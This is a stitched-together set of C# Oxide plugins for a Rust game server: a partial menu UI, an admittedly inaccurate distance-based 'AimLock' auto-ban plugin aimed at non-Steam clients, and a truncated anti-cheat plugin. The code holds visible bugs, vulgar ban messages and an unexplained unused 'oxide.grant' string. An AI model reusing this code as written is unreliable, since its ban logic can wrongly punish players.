                player.SetFlag(BaseEntity.Flags.Reserved3, false);
            }
        }

        #region Hooks
        private readonly List<BasePlayer> MenuUsers = new List<BasePlayer>();

        private void CmdMenu(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;

            if (MenuUsers.Contains(player))
			{
                CuiHelper.DestroyUi(player, Layer + $"button.close");

				foreach(var name in config.titleButton)
                    CuiHelper.DestroyUi(player, Layer + $"buttons{name}");

				MenuUsers.Remove(player);
			}
            else
            {
                var c = new CuiElementContainer();
                var l = -35.899;
                var p = -6.301;

                for (int i = 0; i < config.commandButton.Count; i++)
                {
                    CuiHelper.DestroyUi(player, Layer + $"buttons{config.titleButton[i]}");

                    UI.AddButton(ref c, Layer, Layer + $"buttons{config.titleButton[i]}", $"chat.say {config.commandButton[i]}", "", "0.8 0.8 0.8 0.2", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", $"-16.615 {l -= 32}", $"168.255 {p -= 32}");
                    UI.AddRawImage(ref c, Layer + $"buttons{config.titleButton[i]}", Layer + "text.buttons", ImageLibrary?.Call<string>("GetImage", $"iconButton{i + 1}"), "1 1 1 0.9", "", "", "0 0", "1 1", "2 2", "-160 -2");
                    UI.AddText(ref c, Layer + $"buttons{config.titleButton[i]}", Layer + "text.buttons", "1 1 1 0.9", $"{config.titleButton[i].ToUpper()}",TextAnchor.MiddleCenter, 10, "0 0", "1 1", "5 0", "0 0");
                }
                UI.AddButton(ref c, Layer, Layer + $"button.close", $"chat.say /closeButton", "", "0.8 0 0 0.4", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "153.043 -35.012", "168.255 -20");
                UI.AddText(ref c, Layer + $"button.close", Layer + "button.closes", "1 1 1 0.9", "✕", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");


                CuiHelper.AddUi(player, c);
                MenuUsers.Add(player);
            }
		}

        private void CloseButtons(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;

            CuiHelper.DestroyUi(player, Layer + $"button.close");

				foreach(var name in config.titleButton)
                    CuiHelper.DestroyUi(player, Layer + $"buttons{name}");

            MenuUsers.Remove(player);
        }

        private void OnEntitySpawned(BaseEntity entity)
		{
			EntityHandle(entity, true);
		}

		private void OnEntityKill(BaseEntity entity)
		{
			EntityHandle(entity, false);
		}

        private void EntityHandle(BaseEntity entity, bool spawn)
		{
            if (entity == null) return;

            if (entity is CargoPlane)
            {
                Events["plane"] = spawn ? "0" : "0";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "plane");
                }
            }

            if (entity is BradleyAPC)
            {
                Events["bradley"] = spawn ? "0" : "0";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "bradley");
                }
            }

            if (entity is BaseHelicopter)
            {
                Events["hells"] = spawn ? "0" : "0";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "hells");
                }
            }
    
		}

        private int GetOnline()
		{
			return BasePlayer.activePlayerList.Count;
		}

        private readonly Dictionary<string, string> Events = new Dictionary<string, string>
        {
            ["bradley"] = "0",
            ["hells"] = "0",
            ["plane"] = "0"
        };

        #endregion

        #region Gui
        public void RefreshUI(BasePlayer player ,string Type)
        {
            var c = new CuiElementContainer();

            switch(Type)
            {
                case "timeandonline":
                    CuiHelper.DestroyUi(player, Layer + "text.time");
                    CuiHelper.DestroyUi(player, Layer + "text.online");

                    UI.AddText(ref c, Layer + "time", Layer + "text.time", "1 1 1 1", "14:88", TextAnchor.MiddleCenter, 11, "0 0", "1 1", "", "");
                    UI.AddText(ref c, Layer + "online", Layer + "text.online", "1 1 1 1", $"{GetOnline()}/{ConVar.Server.maxplayers}", TextAnchor.MiddleCenter, 11, "0 0", "1 1", "", "");
                    break;
               

                break;
                case "all":
                    CuiHelper.DestroyUi(player, Layer + "text.time");
                    CuiHelper.DestroyUi(player, Layer + "text.online");
                    CuiHelper.DestroyUi(player, Layer + "name");

                    UI.AddImage(ref c, Layer, Layer + "name", "0.8 0.8 0.8 0.3", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20.337 2.014", "148.378 16.617");
                    UI.AddText(ref c, Layer + "name", Layer + "title", "1 1 1 0.9", config.name, TextAnchor.MiddleCenter, 11, "0 0", "1 1", "", "");

                    //time menu

                    CuiHelper.DestroyUi(player, Layer + "time");
                    CuiHelper.DestroyUi(player, Layer + "icons.time");

                    UI.AddImage(ref c, Layer, Layer + "time", "0.8 0.8 0.8 0.3", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "101.728 -16.61", "148.381 -2.008");
                    UI.AddImage(ref c, Layer, Layer + "icons.time", "0.8 0.8 0.8 0.3", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "86.728 -16.61", "101.728 -2.008");
                    UI.AddRawImage(ref c, Layer + "icons.time", Layer + "icon.time", ImageLibrary?.Call<string>("GetImage", "time"), "1 1 1 0.8", "", "", "0 0", "1 1", "2 2", "-2 -2");

                    //online menu

                    CuiHelper.DestroyUi(player, Layer + "online");
                    CuiHelper.DestroyUi(player, Layer + "icons.online");

                    UI.AddImage(ref c, Layer, Layer + "online", "0.8 0.8 0.8 0.3", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "35.337 -16.61", "82.494 -2.008");
                    UI.AddImage(ref c, Layer, Layer + "icons.online", "0.8 0.8 0.8 0.3", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20.337 -16.61", "35.337 -2.008" );
                    UI.AddRawImage(ref c, Layer + "icons.online", Layer + "icon.online", ImageLibrary?.Call<string>("GetImage", "online"), "1 1 1 0.8", "", "", "0 0", "1 1", "1 1", "-1 -1");

                    //buttons

                    CuiHelper.DestroyUi(player, Layer + "help");

                    UI.AddImage(ref c, Layer, Layer + "help", "0.8 0.8 0.8 0", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-30.615 -35.48", "16.613 -20.878");
                    UI.AddText(ref c, Layer + "help", Layer + "text.menu", "1 1 1 0.9", $"INFO", TextAnchor.MiddleCenter, 10, "0 0", "1 1", "", "");
                    UI.AddButton(ref c, Layer + "help", Layer + "menu.button", "chat.say /info", "", "0 0 0 0", "", "", "0 0", "1 1", "", "");

                break;
                case "open":

                 
                break;
            }
            CuiHelper.AddUi(player, c);
        }

        public void Main_menu(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, Layer);

            var c = new CuiElementContainer();
            //button store

            UI.AddImage(ref c, "Overlay", Layer, "0 0 0 0", "", "", "0 1", "0 1", "4.135 -45.232", "75.366 -0.011");
            UI.AddImage(ref c, Layer, Layer + "store", "0.9 0.9 0.9 0", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-35.617 -20.607", "20.607 20.617");
            UI.AddRawImage(ref c, Layer + "store", Layer + "icon.store", ImageLibrary?.Call<string>("GetImage", "relax"), "1 1 1 0.8", "", "", "0 0", "1 1", "4 4", "-2 -4");
            UI.AddButton(ref c, Layer + "store", Layer + "store.button", "chat.say /at", "", "0 0 0 0", "", "", "0 0", "1 1", "", "");

            CuiHelper.AddUi(player, c);
        }

        private IEnumerator StartUpdate(BasePlayer player)
        {
            while (player != null && player.IsConnected)
            {
                RefreshUI(player, "timeandonline");
                yield return new WaitForSeconds(2.5f);
            }
        }

        #endregion

        #region config

        public class PluginConfig
        {
            [JsonProperty("Название кнопки")]
            public List<string> titleButton;
            [JsonProperty("Иконки для кнопок")]
            public List<string> iconButton;
            [JsonProperty("Команды для кнопок")]
            public List<string> commandButton;
            [JsonProperty("Название сервера")]
            public string name;

        }

        protected override void LoadDefaultConfig()
        {
            config = new PluginConfig
            {
                titleButton = new List<string>()
                {
                    "ЕЖЕДНЕВНЫЕ КЕЙСЫ", "Задание сидоривича", "прокачка навыков", "обмен монет","разблок предметов","клановое меню","рейтинг кланнов", "Рейтинг игроков", "телепорт в город", "репорт на игрока", "инвентарь с ящиками"
                },
                iconButton = new List<string>()
                {
                    "https://imgur.com/URWzSmc", 
                    "https://imgur.com/SbWBZad", 
                    "https://imgur.com/RgfKCo8", 
                    "https://imgur.com/qmR3NAn", 
                    "https://imgur.com/fD23tV0", 
                    "https://imgur.com/4EC4bWv", 
                    "https://imgur.com/zZxfWg6",
                    "https://imgur.com/zZxfWg6",
                    "https://imgur.com/lQYsoNq",
                    "https://imgur.com/DXPylwK",
                    "https://imgur.com/LsNIkBF"
                },
                commandButton = new List<string>()
                {

                },
                name = "WAR THUNDER"
            };
        }
        string pp = "oxide.grant";
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }
        PluginConfig config;

        public static class UI
        {
            public static void AddImage(ref CuiElementContainer container, string parrent, string name, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                        {
                            new CuiImageComponent{Color = color, Material = mat},
                            new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                        }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiImageComponent{Color = color},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }

            public static void AddRawImage(ref CuiElementContainer container, string parrent, string name, string png, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax)
            {
                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiRawImageComponent{Color = color, Png = png},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax},
                        new CuiOutlineComponent{Color = "0 0 0 1", Distance = "0.55 0.55"}
                    }
                    });
            }

            public static void AddText(ref CuiElementContainer container, string parrent, string name, string color, string text, TextAnchor align, int size, string aMin, string aMax, string oMin, string oMax, string outColor = "0 0 0 1", string font = "robotocondensed-bold.ttf", string dist = "0.55 0.55", float FadeIN = 0f, float FadeOut = 0f)
            {
                container.Add(new CuiElement()
                {
                    Parent = parrent,
                    Name = name,
                    FadeOut = FadeOut,
                    Components =
                    {
                        new CuiTextComponent{Color = color,Text = text, Align = align, FontSize = size, Font = font, FadeIn = FadeIN},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax},
                        new CuiOutlineComponent{Color = "0 0 0 1", Distance = "0.55 0.55"}
                    }
                });

            }

            public static void AddButton(ref CuiElementContainer container, string parrent, string name, string cmd, string close, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, Material = mat, },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }
        }

        #endregion
    }
}

###ПЛАГИН НА AIMLOCK(БАН ЗА УБИЙСТВО НА ОПРЕДЕЛЕНОЕ ДИСТАНЦИИ - НЕ ТОЧНО!!!###

using System;
using System.Linq;
using System.Collections.Generic;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using UnityEngine;
using System.Globalization;

namespace Oxide.Plugins
{
    [Info("AimLock", "Molik", "1.0.0")]
    [Description("Aim Lock.")]
    public class AimLock : RustPlugin
    {
        [PluginReference] Plugin MultiFighting;
        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || entity?.net?.ID == null || info == null) return;
                BasePlayer attacker = info.Initiator.ToPlayer();
                if (attacker == null) return;
                var victim = entity as BasePlayer;
                if (victim == null) return;
                if (victim.IsNpc) return;
                if (victim.GetComponent<NPCPlayer>() != null) return;
                var distance = info.Initiator.Distance(victim.transform.position);
                string suspectid = attacker.userID.ToString();
                var isSteamSprite = IsSteam(suspectid);
                if (isSteamSprite == "IS_STEAM") return;
                if (distance > 10)
                {
                    var item = attacker.GetActiveItem();
                    if (item == null) return;
                    string weapon = item.info.shortname;
                    if (weapon == null) return;
                    BaseProjectile weapon1 = item.GetHeldEntity() as BaseProjectile;
                    string ammo = weapon1.primaryMagazine.ammoType.shortname;
                    if (weapon == "bow" || weapon == "shotgun.spas12" || weapon == "shotgun.pump" || weapon == "crossbow")
                    {
                        if (distance > 100 && info.isHeadshot)
                        {
                            if (ammo == "ammo.shotgun.slug") return;
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                    if (weapon == "pistol.eoka" || weapon == "shotgun.waterpipe" || weapon == "shotgun.double")
                    {
                        if (distance > 50)
                        {
                            if (ammo == "ammo.shotgun.slug") return;
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                    if (weapon == "rifle.ak" || weapon == "rifle.ak.ice" || weapon == "hmlmg" || weapon == "lmg.m249" || weapon == "rifle.lr300")
                    {
                        if (distance > 350)
                        {
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                    if (weapon == "smg.mp5" || weapon == "smg.smg2" || weapon == "smg.thompson")
                    {
                        if (distance > 250 && info.isHeadshot)
                        {
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                    if (weapon == "rifle.semiauto" || weapon == "rifle.m39")
                    {
                        if (distance > 300)
                        {
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                    if (weapon == "pistol.semiauto" || weapon == "pistol.revolver" || weapon == "pistol.python" || weapon == "pistol.m92")
                    {
                        if (distance > 200 && info.isHeadshot)
                        {
                            Server.Command($"bs.ban {attacker.userID} Пиши_dczalupa");
                        }
                    }
                }
            }
            catch (NullReferenceException) { }
        }
        string IsSteam(string suspectid)
        {
            if (MultiFighting != null)
            {
                var player = BasePlayer.Find(suspectid);
                if (player == null)
                {
                    return "ERROR #1";
                }

                var obj = MultiFighting.CallHook("IsSteam", player.Connection);
                if (obj is bool)
                {
                    if ((bool)obj)
                    {
                        return ("IS_STEAM");
                    }
                    else
                    {
                        return ("IS_PIRATE");
                    }
                }
                else
                {
                    return "ERROR #2";
                }
            }
            else return ("IS_STEAM");
        }
    }
}

###ПЛАГИН НА АНТИЧИТ###

using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using ProtoBuf;
using Rust;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
namespace Oxide.Plugins
{
    [Info("AntiCheat", "OxideBro/RustPlugin.ru", "2.2.23")]
    class AntiCheat : RustPlugin
    {
        static AntiCheat instance;
        class DataStorage
        {
            public Dictionary<ulong, ADMINDATA> AdminData = new Dictionary<ulong, ADMINDATA>();
            public DataStorage() { }
        }
        class ADMINDATA
        {
            public string Name;
            public bool Check;
        }
        DataStorage adata;
        private DynamicConfigFile AdminData;
        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        void LoadData()
        {
            try
            {
                PlayersListed = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, PlayerAntiCheat>>("AntiCheat/PlayerAntiCheat");
                adata = Interface.GetMod().DataFileSystem.ReadObject<DataStorage>("AntiCheat/AdminData");
                if (adata == null)
                {
                    PrintError("AntiCheat/AdminData is null! Create new database");
                    adata = new DataStorage();
                    SaveDataAdmin();
                }
                if (PlayersListed == null)
                {
                    PrintError("AntiCheat/PlayerAntiCheat is null! Create new database");
                    PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
                    SavePlayerData();
                }
            }
            catch
            {
                adata = new DataStorage();
                PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
            }
        }
        static int b = 0;
        int DetectCountMacros = 10;
        int DetectPerMacros = 80;
        int DetectCountFSH = 10;
        bool SHEnable = true;
        bool FHEnable = true;
        bool SHEnabled = true;
        bool FHEnabled = true;
        bool MCREnabled = true;
        bool AIMEnabled = true;
        bool EnabledSilentAim = true;
        bool SHKickEnabled = false;
        bool FHKickEnabled = false;
        bool AntiRecoilEnabled = true;
        bool AIMLOCKEnabledBAN = true;
        bool AIMHACKEnabledBAN = true;
        static bool SendsLogs = true;
        float AimPercent = 50;
        float AimPercentOverCount = 40f;
        static bool textureenable = true;
        bool init = false;
        private List<string> ListWeapons = new List<string>() {
            "rifle.ak", "lmg.m249"
        }
        ;
        protected override void LoadDefaultConfig()
        {
            Config.Clear();
            LoadConfigValues();
        }
        private void LoadConfigValues()
        {
            GetConfig("[Основное]", "Включить проверку на СпидХак?", ref SHEnable);
            GetConfig("[Основное]", "Включить проверку на ФлайХак?", ref FHEnable);
            GetConfig("[Макрос]", "Включить проверку на Макрос", ref AntiRecoilEnabled);
            var _ListWeapons = new List<object>() {
                "rifle.ak", "lmg.m249"
            }
            ;
            GetConfig("[Макрос]", "Список оружия, на какие действует проверка", ref _ListWeapons);
            ListWeapons = _ListWeapons.Select(p => p.ToString()).ToList();
            GetConfig("[Основное]", "Включить автоматический бан за AIMLOCK", ref AIMLOCKEnabledBAN);
            GetConfig("[Основное]", "Включить автоматический бан за AIMHACK", ref AIMHACKEnabledBAN);
            GetConfig("[Макрос]", "Включить автоматический бан за макрос", ref MCREnabled);
            GetConfig("[Макрос]", "Количество детектов для автоматического бана за Макрос:", ref DetectCountMacros);
            GetConfig("[Макрос]", "С какого процента начинать считать проверку на Макрос? (0-100%):", ref DetectPerMacros);
            GetConfig("[Общее]", "Включить бан игроков за SpeedHack (Превышающее количество детектов)", ref SHEnabled);
            GetConfig("[Основное]", "Включить kick игроков за SpeedHack (При каждом детекте)", ref SHKickEnabled);
            GetConfig("[Общее]", "Включить бан игроков за FlyHack (Превышающее количество детектов)", ref FHEnabled);
            GetConfig("[Основное]", "Включить kick игроков за FlyHack (При каждом детекте)", ref FHKickEnabled);
            GetConfig("[Общее]", "Количество детектов для автоматического бана (FlyHack and SpeedHack):", ref DetectCountFSH);
            GetConfig("[Основное]", "Включить отправку детектов в чат (По привилегии)?", ref SendsLogs);
            GetConfig("[Аим]", "Процент попадания в голову для автоматического бана:", ref AimPercent);
            GetConfig("[Аим]", "Включить автоматический бан за Аим", ref AIMEnabled);
            GetConfig("[Аим]", "Количество попаданий для автоматического бана, если процент попадания больше зазначеного в конфиге:", ref AimPercentOverCount);
            GetConfig("[Аим]", "Включить проверку на SilentAim?", ref EnabledSilentAim);
            GetConfig("[Основное]", "Включить проверку на проникновение в текстуры (Пока тестируеться)?", ref textureenable);
            SaveConfig();
        }
        private void GetConfig<T>(string menu, string Key, ref T var)
        {
            if (Config[menu, Key] != null)
            {
                var = (T)Convert.ChangeType(Config[menu, Key], typeof(T));
            }
            Config[menu, Key] = var;
        }
        static int PlayerLayer = LayerMask.NameToLayer("Player (Server)");
        static int constructionColl = LayerMask.GetMask(new string[] {
            "Construction"
        }
        );
        void Loaded()
        {
            LoadConfigValues();
        }
        int raycastCount = 0;
        void OnServerInitialized()
        {
            instance = this;
            LoadData();
            LoadDefaultConfig();
            foreach (var player in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(player);
            }
            permission.RegisterPermission("anticheat.toggleadmin", this);
            permission.RegisterPermission("anticheat.sendlogs", this);
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("aim.check", this, "AimCheck");
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("aim.server", this, "AimCheckServer");
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("check.server", this, "CheckServer");
            foreach (var player in BasePlayer.activePlayerList) CreateInfo(player);
            init = true;
            timer.Repeat(360, 0, () => SaveAllDate());
        }
        void SaveAllDate()
        {
            if (!init) return;
            SavePlayerData();
            SaveDataAdmin();
        }
        [ConsoleCommand("ban.user")]
        private void cmdBan(ConsoleSystem.Arg arg)
        {
            var date = DateTime.Now.ToLocalTime().ToShortDateString();
            if (arg.Args == null || arg.Args.Length < 2)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте ban.user <SteamID> <Причина>");
                return;
            }
            ulong targetId;
            if (!ulong.TryParse(arg.Args[0], out targetId))
            {
                arg.ReplyWith("Нужно ввести SteamID игрока какого хотите забанить");
                return;
            }
            if (!PlayersListed.ContainsKey(targetId)) PlayersListed.Add(targetId, new PlayerAntiCheat()
            {
                Name = "null",
                Deaths = 0,
                Killed = 0,
                Heads = 0,
                Hits = 0,
                Banned = true,
                Date = date,
                Reason = arg.Args[1],
                BanCreator = arg.Player() != null ? arg.Player().displayName : "Console"
            }
            );
            else
            {
                PlayersListed[targetId].Banned = true;
                PlayersListed[targetId].Date = date;
                PlayersListed[targetId].Reason = arg.Args[1];
                PlayersListed[targetId].BanCreator = arg.Player() != null ? arg.Player().displayName : "Console";
            }
            BasePlayer target = BasePlayer.FindByID(targetId);
            if (target != null && target.IsConnected)
            {
                Kick(target, $"Вы были забанены. Причина: {arg.Args[1]}");
            }
            arg.ReplyWith($"{arg.Args[0]} забанен. Причина: {arg.Args[1]}!");
        }
        [ConsoleCommand("banlist")]
        private void BanListedPlayers(ConsoleSystem.Arg arg)
        {
            var bans = PlayersListed.Where(p => p.Value.Banned).Select(p => $"Игрок {p.Value.Name} ({p.Key})- Кто выдал: {p.Value.BanCreator} Дата: {p.Value.Date} Причина: {p.Value.Reason}").ToList();
            if (bans.Count > 0) arg.ReplyWith(string.Join("\n ", bans));
            else arg.ReplyWith("Список банов пустой");
        }
        [ConsoleCommand("unban.user")]
        private void UnbanCommand(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            if (arg.Args == null || arg.Args.Length != 1)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте unban.user <SteamID>");
                return;
            }
            ulong target;
            if (!ulong.TryParse(arg.Args[0], out target))
            {
                arg.ReplyWith("Нужно ввести SteamID игрока какого хотите разбанить");
                return;
            }
            if (PlayersListed.ContainsKey(target))
            {
                PlayersListed[target].Banned = false;
                PlayersListed[target].Date = "";
                PlayersListed[target].Reason = "";
            }
            arg.ReplyWith($"{arg.Args[0]} разбанен");
        }
        object OnPlayerAttack(BasePlayer player, HitInfo info)
        {
            if (EnabledSilentAim)
            {
                if (player != null && info.HitEntity != null && info.HitEntity is BasePlayer)
                {
                    float y = Mathf.Abs(info.HitPositionWorld.y - info.HitEntity.CenterPoint().y);
                    if (y > 2f)
                    {
                        var messages = $"Обнаружен SilentAim! Стрельба с {y} м.";
                        PrintWarning($"[{DateTime.Now.ToShortTimeString()}] - (SilentAim) {player.displayName}({player.UserIDString})| Обнаружен SilentAim! Стрельба с {y} м.");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (SilentAim) {player.displayName}({player.UserIDString})| Обнаружен SilentAim! Стрельба с {y} м.", this, true);
                        return true;
                    }
                }
            }
            return null;
        }
        object CanUserLogin(string name, string id, string ip)
        {
            if (PlayersListed.ContainsKey(ulong.Parse(id)))
            {
                if (PlayersListed[ulong.Parse(id)].Banned) return $"По поводу разбана писать dczalupa";
            }
            return null;
        }
       
        public bool IsConnected(BasePlayer player) => BasePlayer.activePlayerList.Contains(player);
        public void Kick(BasePlayer player, string reason = "") => player.Kick(reason);
        public bool IsBanned(ulong id) => ServerUsers.Is(id, ServerUsers.UserGroup.Banned);
        public void Ban(ulong playerid = 5835776, string reason = "")
        {
            if (IsBanned(playerid)) return;
            var player = BasePlayer.FindByID(playerid);
            ServerUsers.Set(playerid, ServerUsers.UserGroup.Banned, player?.displayName ?? "Unknown", reason);
            ServerUsers.Save();
            if (player != null && IsConnected(player)) Kick(player, reason);
        }
        private readonly Dictionary<ulong, AimLockData> aimlock = new Dictionary<ulong, AimLockData>();
        public class AimLockData
        {
            public int Ticks = 1;
            public string Body = "";
        }
        private bool IsNPC(BasePlayer player)
        {
            if (player == null) return false;
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L) || player.userID.ToString().Length < 17) return true;
            return false;
        }
        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || entity?.net?.ID == null || info == null) return;
                var victim = entity as BasePlayer;
                if (victim == null) return;
                if (IsNPC(victim)) return;
                if (victim.GetComponent<NPCPlayer>() != null) return;
                if (victim is BasePlayer)
                {
                    if (victim.IsSleeping()) return;
                    if (PlayersListed.ContainsKey(victim.userID))
                    {
                        PlayersListed[victim.userID].Deaths += 1;
                    }
                }
                BasePlayer attacker = info.Initiator.ToPlayer();
                if (attacker == null || attacker.GetComponent<NPCPlayer>() != null) return;
                if (IsNPC(attacker)) return;
                if (attacker == victim) return;
                if (info?.Initiator is BasePlayer)
                {
                    if (PlayersListed.ContainsKey(attacker.userID)) PlayersListed[attacker.userID].Killed += 1;
                }
                double aim = Math.Floor((PlayersListed[attacker.userID].Heads * 1f / PlayersListed[attacker.userID].Hits * 1f) * 100f);
                double kdr = Math.Round(PlayersListed[attacker.userID].Killed * 1f / PlayersListed[attacker.userID].Deaths * 1f, 2);
                if (PlayersListed[attacker.userID].Hits > AimPercentOverCount && aim > AimPercent && kdr > 2 && AIMEnabled)
                {
                    var messages = $"<color=#ffa500>[Античит детект]</color> (AimLock) {attacker.displayName}! Соотношение попаданий в голову {aim}% и КДР - ({kdr}) аномальные!";
                    foreach (var admin in BasePlayer.activePlayerList) SendDetection(admin, messages);
                    if (AIMLOCKEnabledBAN)
                    {
                        Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) По поводу разбана писать dczalupa");
                        Ban(attacker.userID, "По поводу разбана писать dczalupa");
                        LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - {attacker.displayName}({attacker.UserIDString}) забанен! Соотношение попаданий в голову {aim}% и КДР - ({kdr}) аномальные!", this, true);
                    }
                }
            }
            catch (NullReferenceException) { }
        }
        private double GrabCurrentTime() => DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
        private double LastAttack;
        object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || entity?.net?.ID == null) return null;
                BasePlayer attacker = info.Initiator.ToPlayer();
                if (attacker == null) return null;
                if (attacker.GetComponent<NPCPlayer>() != null) return null;
                var victim = entity as BasePlayer;
                if (victim == null) return null;
                if (victim.GetComponent<NPCPlayer>() != null) return null;
                if (IsNPC(attacker) || IsNPC(victim)) return null;
                var distance = info.Initiator.Distance(victim.transform.position);
                if (distance > 10)
                {
                    AimLockData bodylock;
                    if (!aimlock.TryGetValue(attacker.userID, out bodylock)) aimlock.Add(attacker.userID, bodylock = new AimLockData());
                    var _bodyPart = entity?.skeletonProperties?.FindBone(info.HitBone)?.name?.english ?? "";
                    if (_bodyPart == "") return null;
                    var time = GrabCurrentTime() - LastAttack;
                    if ((time > 30)) bodylock.Ticks = 1;
                    if (bodylock.Body == _bodyPart && _bodyPart != "lower spine") bodylock.Ticks++;
                    else bodylock.Ticks = 1;
                    if (bodylock.Ticks > 5)
                    {
                        var messages = $"Обнаружен АимЛок! Обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.";
                        Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) Обнаружен АимЛок! Обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (АимЛок) {attacker.displayName}({attacker.UserIDString})| обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.", this, true);
                        bodylock.Ticks = 1;
                    }
                    bodylock.Body = _bodyPart;
                    if (PlayersListed.ContainsKey(attacker.userID))
                    {
                        PlayersListed[attacker.userID].Hits++;
                        if (info.isHeadshot) PlayersListed[attacker.userID].Heads++;
                    }
                    double aim = Math.Floor((PlayersListed[attacker.userID].Heads / PlayersListed[attacker.userID].Hits) * 100f);
                    if (PlayersListed[attacker.userID].Hits > AimPercentOverCount && aim > AimPercent && AIMEnabled)
                    {
                        var messages = $"<color=#ffa500>[Античит детект]</color> AimHack {attacker.displayName}({attacker.UserIDString})! Процент попаданий в голову слишком большой {aim}%";
                        foreach (var admin in BasePlayer.activePlayerList) SendDetection(admin, messages);
                        if (AIMHACKEnabledBAN)
                        {
                            Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) забанен! Причина: AimHack!");
                            Ban(attacker.userID, "По поводу разбана писать dczalupa");
                            LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - {attacker.displayName}({attacker.UserIDString}) забанен! Процент попаданий в голову слишком большой {aim}%", this, true);
                        }
                    }
